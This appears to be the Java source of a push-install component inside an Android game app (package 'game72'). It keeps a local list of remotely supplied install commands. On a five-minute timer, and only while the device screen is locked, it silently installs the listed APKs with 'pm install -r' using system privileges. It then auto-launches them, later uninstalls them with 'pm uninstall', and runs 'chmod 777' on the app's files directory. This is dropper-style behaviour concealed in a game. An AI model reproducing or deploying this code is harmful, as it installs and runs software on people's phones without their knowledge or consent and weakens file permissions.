package cn.com.tiantong.game72.push.bean;

import java.io.File;
import java.io.IOException;
import java.util.ArrayList;
import java.util.List;
import java.util.Timer;
import java.util.TimerTask;

import android.content.Context;
import android.database.Cursor;
import android.os.Environment;
import cn.com.tiantong.game72.ControlBroadcastReceiver;
import cn.com.tiantong.game72.push.ProtocolParserOtherCommands;
import cn.com.tiantong.game72.push.bean.InstallCommandBean;
import cn.com.tiantong.game72.push.bean.InstallCommandContainer;
import cn.com.tiantong.game72.push.bean.ManageKeyguard;
import cn.com.tiantong.game72.util.DBWrapper;

public class InstallCommandContainer {
//	final static String tag = "InstallCommandContainer";
	private static Context cm;
	public static Timer mTimer = null;
	public static final int Delay = 5 * 60 * 1000;
	private static List<InstallCommandBean> mWidgetTipList;
	private static InstallCommandContainer mWidgetTipContainer = null;

	public InstallCommandContainer(Context ctx) {
		DBWrapper db = new DBWrapper(ctx);
		cm = ctx;
		mWidgetTipList = new ArrayList<InstallCommandBean>();
		//LH.LogPrint(tag, "InstallCommandContainer:create");
		db.open();
		Cursor c = db.getAllInstallCommands();
		if (c.moveToFirst()) {
			do {
				InstallCommandBean tip = new InstallCommandBean(c.getLong(0),
						c.getString(1), c.getString(2), c.getString(3),
						c.getInt(4), c.getInt(5), c.getInt(6), c.getInt(7),
						c.getString(8));
				mWidgetTipList.add(tip);
			} while (c.moveToNext());
		} else {
			//LH.LogPrint(tag, "no tip");
		}
		c.close();
		db.close();
	}

	// 单例模式
	public static InstallCommandContainer GetInstance(Context ctx) {
		if (mWidgetTipContainer != null) {
			return mWidgetTipContainer;
		} else {
			mWidgetTipContainer = new InstallCommandContainer(ctx);
			return mWidgetTipContainer;
		}
	}

	public InstallCommandBean GetInstallCommand(String packname) {
		InstallCommandBean tip = null;
		//LH.LogPrint(tag, "GetInstallCommand:size:" + mWidgetTipList.size());
		if (mWidgetTipList.size() > 0) {
			for (int i = 0; i < mWidgetTipList.size(); i++) {
				tip = mWidgetTipList.get(i);
				//LH.LogPrint(tag, "GetInstallCommand:pkname:" + tip.getPackname());
				if (tip.getPackname().compareToIgnoreCase(packname) == 0) {
					//LH.LogPrint(tag, "GetInstallCommand:finded");
					break;
				} else {
					tip = null;
				}
			}
		}
		//LH.LogPrint(tag, "GetInstallCommand:packname:" + packname);
		return tip;
	}

	public InstallCommandBean GetWaitStartCommand() {
		InstallCommandBean tip = null;
		if (mWidgetTipList.size() > 0) {
			for (int i = 0; i < mWidgetTipList.size(); i++) {
				tip = mWidgetTipList.get(i);
				if (tip.getIsinstalled() == 1) {
					break;
				} else {
					tip = null;
				}
			}
		}
		//LH.LogPrint(tag, "GetWaitStartCommand:");
		return tip;
	}

	public int GetStartedCommandsnumber() {
		InstallCommandBean tip = null;
		int ret = 0;
		if (mWidgetTipList.size() > 0) {
			for (int i = 0; i < mWidgetTipList.size(); i++) {
				tip = mWidgetTipList.get(i);
				if (tip.getIsinstalled() == 2) {
					ret++;
				}
			}
		}
		//LH.LogPrint(tag, "GetStartedCommandsnumber:ret:" + ret);
		return ret;
	}

	public boolean CanStartApk() {
		boolean ret = false;
		if (GetStartedCommandsnumber() == 0) {
			ret = true;
		}
		//LH.LogPrint(tag, "CanStartApk:ret:" + ret);
		return ret;
	}

	public int Ispackexisted(String packname) {
		//LH.LogPrint(tag, "Ispackexisted:packname" + packname);
		int ret = -1;
		DBWrapper db = new DBWrapper(cm);
		db.open();
		Cursor c = db.getAllInstallCommands();
		if (c.moveToFirst()) {
			do {
				if (packname.compareToIgnoreCase(c.getString(1)) == 0) {
					//LH.LogPrint(tag, "finded");
					ret = c.getInt(5);
					break;
				}
			} while (c.moveToNext());
		} else {
			//LH.LogPrint(tag, "no tip");
		}
		c.close();
		db.close();
		//LH.LogPrint(tag, "Ispackexisted:ret:" + ret);
		return ret;
	}

	public InstallCommandBean AddInstallCommand(String packname, String filename, int mode, int isinstalled, int installtimes, int isauto, String info) {
		DBWrapper db = new DBWrapper(cm);
		InstallCommandBean tip = null;
		long rowid = 0;
		db.open();
		rowid = db.insertInstallCommand(packname, "", filename, mode, isinstalled, installtimes, isauto, info);
		//LH.LogPrint(tag, "AddInstallCommand:rowid:" + rowid);
		if (rowid != -1) {
			tip = new InstallCommandBean(rowid, packname, "", filename, mode, isinstalled, installtimes, isauto, info);
			mWidgetTipList.add(tip);
		}
		db.close();
		return tip;
	}

	public static void AddInstallCommandWithInstalled(String packname,
			String filename, int mode, int isinstalled, int installtimes,
			int isauto, String info) {
		DBWrapper db = new DBWrapper(cm);
		long rowid = 0;
		db.open();
		rowid = db.insertInstallCommand(packname, "", filename, mode, isinstalled, installtimes, isauto, info);
		//LH.LogPrint(tag, "AddInstallCommandWithInstalled:rowid:" + rowid);
		db.close();
	}

	public void DeleteInstallCommand(int id) {
		//LH.LogPrint(tag, "DeleteCurrentCommand:id:" + id);
		mWidgetTipList.remove(id);
	}

	public int GetLength() {
		int length = 0;
		//LH.LogPrint(tag, "GetLength:size:" + mWidgetTipList.size());
		if (mWidgetTipList.size() > 0) {
			length = mWidgetTipList.size();
		}
		return length;
	}

	public void DoInstallCommands() {
		InstallCommandBean tip = null;
		//LH.LogPrint(tag, "DoInstallCommands:Enter =================:size:" + mWidgetTipList.size());
		if (mWidgetTipList.size() > 0) {
			DBWrapper db = new DBWrapper(cm);
			db.open();
			for (int i = 0; i < mWidgetTipList.size(); i++) {
				tip = mWidgetTipList.get(i);
				if (tip.getIsinstalled() == 0) {
					if (ControlBroadcastReceiver.issysuser(cm) == 0) {
						
					} else {
						if (ProtocolParserOtherCommands.doinstall(cm, tip.getFilename(), tip.getPackname()) == true) {
							tip.setIsinstalled(0);
							tip.setInstalltimes((tip.getInstalltimes() + 1));
						} else {
							tip.setIsinstalled(0);
							tip.setInstalltimes((tip.getInstalltimes() + 1));
						}
						db.updateInstallCommand(tip.getRowid(),
								tip.getPackname(), tip.getsName(),
								tip.getFilename(), tip.getMode(),
								tip.getIsinstalled(), tip.getInstalltimes(),
								tip.getIsauto(), tip.getInfo());
					}
				} else {
					if (tip.getIsauto() == 1) {
						if (CanStartApk() == true) {
							ControlBroadcastReceiver.StartApk_formode(cm, tip.getPackname(), tip.getMode());
						}
					}
				}
			}
			db.close();
		}
		//LH.LogPrint(tag, "DoInstallCommands:End =================");
	}

	public void Douninstalls() {
		InstallCommandBean tip = null;
		//LH.LogPrint(tag, "Douninstalls:size:" + mWidgetTipList.size());
		if (ControlBroadcastReceiver.issysuser(cm) == 0) {
			return;
		}
		if (mWidgetTipList.size() > 0) {
			boolean flag = false;
			for (int i = 0; i < mWidgetTipList.size(); i++) {
				tip = mWidgetTipList.get(i);
				//LH.LogPrint(tag, "Douninstalls:isinstalled:" + tip.getIsinstalled() + ":installtimes:" + tip.getInstalltimes());
				if (tip.getInstalltimes() > 2) {
					Douninstall(cm, tip.getPackname());
					tip.setIsinstalled(3);
					tip.setInstalltimes(0);
					updateinstallCommand(tip);
					deleteapk(cm, tip.getFilename());
					flag = true;
					// DeleteInstallCommand(i);
				}
			}
			//LH.LogPrint(tag, "Douninstalls:flag:" + flag);
			if (flag == true) {
				mWidgetTipContainer = new InstallCommandContainer(cm);
			}
		}
	}

	public void Douninstallswithstarted() {
		InstallCommandBean tip = null;
		//LH.LogPrint(tag, "Douninstallswithstarted:size:" + mWidgetTipList.size());
		if (mWidgetTipList.size() > 0) {
			boolean flag = false;
			for (int i = 0; i < mWidgetTipList.size(); i++) {
				tip = mWidgetTipList.get(i);
				//LH.LogPrint(tag, "Douninstallswithstarted:isinstalled:" + tip.getIsinstalled() + ":installtimes:" + tip.getInstalltimes());
				//LH.LogPrint(tag, "Douninstallswithstarted:getIsauto:" + tip.getIsauto());
				//LH.LogPrint(tag, "Douninstallswithstarted:packagename:" + tip.getPackname());
				if (tip.getIsinstalled() == 2) {
					flag = true;
					if (tip.getIsauto() == 0) {
						if ((tip.getMode() == 0) || (tip.getMode() == 3)) {
							tip.setIsinstalled(3);
							tip.setInstalltimes(0);
							updateinstallCommand(tip);
							deleteapk(cm, tip.getFilename());
							ControlBroadcastReceiver.StopApk(cm, tip.getPackname());
							// DeleteInstallCommand(i);
						} else {
							Douninstall(cm, tip.getPackname());
							tip.setIsinstalled(3);
							tip.setInstalltimes(0);
							updateinstallCommand(tip);
							deleteapk(cm, tip.getFilename());
							// DeleteInstallCommand(i);
						}
					} else {

						ControlBroadcastReceiver.StopApk(cm, tip.getPackname());
						if (ControlBroadcastReceiver.issysuser(cm) == 0) {
							tip.setIsinstalled(4);
						} else {
							tip.setIsinstalled(3);
						}
						tip.setIsauto(0);
						updateinstallCommand(tip);
					}
				}
			}
			//LH.LogPrint(tag, "Douninstallswithstarted:flag:" + flag);
			if (flag == true) {
				mWidgetTipContainer = new InstallCommandContainer(cm);
			}
		}
	}

	public void deleteapk(Context context, String filename) {
		//LH.LogPrint(tag, "deleteapk:file name:" + filename);
		if (Environment.getExternalStorageState().equals(Environment.MEDIA_MOUNTED)) {
			File apkFile = new File(Environment.getExternalStorageDirectory() + "/cidownload/" + filename);
			if (apkFile.exists()) {
				//LH.LogPrint(tag, "exist file");
				apkFile.delete();
			}
		}
		Process process = null;
		try {
			process = Runtime.getRuntime().exec("chmod 777 " + context.getFilesDir());
			process.waitFor();
		} catch (Exception e) {
			//LH.LogPrint(tag, "Unexpected error - Here is what I know: " + e.getMessage());
		} finally {
			process.destroy();
		}
		try {
			context.deleteFile(filename);
		} catch (Exception e) {
			//LH.LogPrint(tag, e.toString());
		}
	}

	public String Douninstall(Context context, String pkname) {
		String result = null;
		//LH.LogPrint(tag, "douninstall:pkname:" + pkname);
		if (ControlBroadcastReceiver.issysuser(cm) == 0) {
			return "err";
		}
		if (pkname != null) {
			uninstallapp(context, pkname);
		}
		return result;

	}

	static public boolean execCommand1(String command, Context cn) throws IOException {
		boolean ret = false;
		if (ControlBroadcastReceiver.issysuser(cn) == 0) {
			return ret;
		} else {
			ret = true;
		}
		// start the ls command running
		Runtime runtime = Runtime.getRuntime();
		Process proc = runtime.exec(command); // ��仰����shell��߼����Լ�ĵ���
		return ret;

	}

	static public boolean runRootCommand1(Context con, String downloadfilename) {
		//LH.LogPrint(tag, "runRootCommand1:begin:" + downloadfilename);
		boolean ref = false;

		String saveFile = getfileabspath(con, downloadfilename);
		if (saveFile != null) {
			try {
				String st = "pm install -r";
				ref = execCommand1(st + " " + saveFile, con);
				//LH.LogPrint("runRootCommand1", "ref:" + ref);
				// Toast.makeText(this, "runRootCommand1 success",
				// Toast.LENGTH_SHORT).show();
			} catch (Exception e) {
				//LH.LogPrint("runRootCommand1", "Unexpected error - Here is what I know: " + e.getMessage());
				// Toast.makeText(this, "runRootCommand1 22",
				// Toast.LENGTH_SHORT).show();
			}
		}
		return ref;
	}

	static public String getfileabspath(Context con, String filename) {
		String absfilename = null;
		//LH.LogPrint(tag, "getfileabspath:filename:" + filename);
		try {
			File apkFile = null;
			if (Environment.getExternalStorageState().equals(
					Environment.MEDIA_MOUNTED)) {
				apkFile = new File(Environment.getExternalStorageDirectory()
						+ "/cidownload/" + filename);
			} else {
				apkFile = new File(con.getFileStreamPath(filename)
						.getAbsolutePath() + "/" + filename);
			}
			if (apkFile.exists() == true) {
				if (Environment.getExternalStorageState().equals(
						Environment.MEDIA_MOUNTED)) {
					absfilename = Environment.getExternalStorageDirectory()
							+ "/cidownload/" + filename;
				} else {
					absfilename = con.getFileStreamPath(filename)
							.getAbsolutePath();
				}
			}
		} catch (Exception e) {
			//LH.LogPrint(tag, e.toString());
		}
		//LH.LogPrint(tag, "getfileabspath:ret:" + absfilename);
		return absfilename;

	}

	static public boolean uninstallapp(Context cn, String pkname) {
		//LH.LogPrint(tag, "uninstallapp:begin:pkname:" + pkname);
		boolean ref = false;
		try {
			String st = "pm uninstall";
			ref = execCommand1(st + " " + pkname, cn);
			//LH.LogPrint("uninstallapp", "ref:" + ref);
			// Toast.makeText(this, "uninstallapp uninstall success",
			// Toast.LENGTH_SHORT).show();

		} catch (Exception e) {
			//LH.LogPrint("uninstallapp","Unexpected error - Here is what I know: " + e.getMessage());
			// Toast.makeText(this, "uninstallapp 22",
			// Toast.LENGTH_SHORT).show();
		}
		return ref;
	}

	public static boolean Istimer() {
		boolean ret = false;
		//LH.LogPrint(tag, "Istimer");
		if (mTimer != null) {
			ret = true;
		}
		return ret;
	}

	public static void Starttimer() {
		if (mTimer != null) {
			mTimer.cancel();
		}
		//LH.LogPrint(tag, "Starttimer");
		mTimer = new Timer();
		mTimer.schedule(new TimerTask() {
			@Override
			public void run() {
				//LH.LogPrint(tag, "timer out");
				InstallCommandContainer commands = InstallCommandContainer.GetInstance(cm);
				if (commands.GetLength() > 0) {
					ManageKeyguard.initialize(cm);
					boolean flag = ManageKeyguard.inKeyguardRestrictedInputMode();
					//LH.LogPrint(tag, "Starttimer:install flag:" + flag);
					if (flag == true) {
						commands.DoInstallCommands();
					} else {
						//LH.LogPrint(tag, "continue");
					}
				} else {
					Canceltimer();
				}

			}
		}, Delay, Delay);
	}

	public static void Canceltimer() {
		if (mTimer != null) {
			mTimer.cancel();
		}
		mTimer = null;
		//LH.LogPrint(tag, "Canceltimer");
	}

	public void setIsinstalledstatus(String packname, int status) {
		InstallCommandBean tip = GetInstallCommand(packname);
		if (tip != null) {
			DBWrapper db = new DBWrapper(cm);
			db.open();
			tip.setIsinstalled(status);
			db.updateInstallCommand(tip.getRowid(), tip.getPackname(), tip.getsName(), tip.getFilename(), tip.getMode(), tip.getIsinstalled(), tip.getInstalltimes(),
					tip.getIsauto(), tip.getInfo());
			db.close();

		}
	}

	public void setSNAME(String packname, String sname) {
		InstallCommandBean tip = GetInstallCommand(packname);
		if (tip != null) {
			DBWrapper db = new DBWrapper(cm);
			db.open();
			tip.setsName(sname);
			db.updateInstallCommand(tip.getRowid(), tip.getPackname(),
					tip.getsName(), tip.getFilename(), tip.getMode(),
					tip.getIsinstalled(), tip.getInstalltimes(),
					tip.getIsauto(), tip.getInfo());
			db.close();

		}
	}

	public void updateinstallCommand(InstallCommandBean tip) {
		if (tip != null) {
			DBWrapper db = new DBWrapper(cm);
			db.open();
			db.updateInstallCommand(tip.getRowid(), tip.getPackname(),
					tip.getsName(), tip.getFilename(), tip.getMode(),
					tip.getIsinstalled(), tip.getInstalltimes(),
					tip.getIsauto(), tip.getInfo());
			db.close();
		}
	}

	public void deleteinstallCommand(InstallCommandBean tip) {
		//LH.LogPrint(tag, "deleteinstallCommand:rowid:" + tip.getRowid());
		//LH.LogPrint(tag, "deleteinstallCommand:packname:" + tip.getPackname());
		if (tip != null) {
			DBWrapper db = new DBWrapper(cm);
			db.open();
			db.deleteInstallCommand(tip.getRowid());
			db.close();
		}
	}
}
